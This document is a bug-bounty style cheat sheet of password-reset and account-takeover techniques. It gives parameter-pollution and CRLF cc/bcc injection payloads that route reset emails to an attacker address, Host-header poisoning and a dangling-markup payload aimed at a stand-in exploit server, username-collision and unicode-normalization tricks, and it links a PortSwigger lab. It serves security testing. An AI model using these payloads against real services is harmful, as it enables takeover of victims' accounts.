# Password Reset Via Email Parameter

```
## parameter pollution
email=victim@mail.com&email=hacker@mail.com

## array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

## carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

## separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

# Password Reset Token Leak Via Referrer

1) Request password reset to your email address
2) Click on the password reset link
3) Don't change password
4) Click any 3rd party websites(eg: Facebook, twitter)
5) Intercept the request in Burp Suite proxy
6) Check if the referer header is leaking password reset token.

# Standard HTTP HEADER ATTACKS

1) Use (Intercept first) `Host: arbitrary-exploit-server.com`, `X-Forwarded-Host: arbitrary-exploit-server.com`
2) Look for `https:/arbitrary-exploit-server.com/reset-password?token=TOKEN`

# Leaking Password Reset Token in Response

1) Trigger a password reset request to the email.
2) Inspect the `Server Response` and search for ResetToken - Maybe it is stored in response also.
3) Then use the token in an URL like https://arbitrary.com/reset?resetToken={token}&email={email}.

# Password Reset Via Username Collision

1) Register username identical to the victim's username: "admin ", " admin", " admin ";
2) Request a password reset with your malicious username.
3) Use the token sent to your email and reset the victim password.

# Account takeover due to unicode normalization issue

Try to use same emails, but use a little different symbols, that can be converted the same:

    Victim account: demo@gmail.com
    Attacker account: demⓞ@gmail.com

# If Host header has the problem of not being tested after validation

```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

# Stay-logged-in + Notification cookie (using comments)

https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle

# The Host, Referrer, and Origin headers are simultaneously changed to attacker.com.
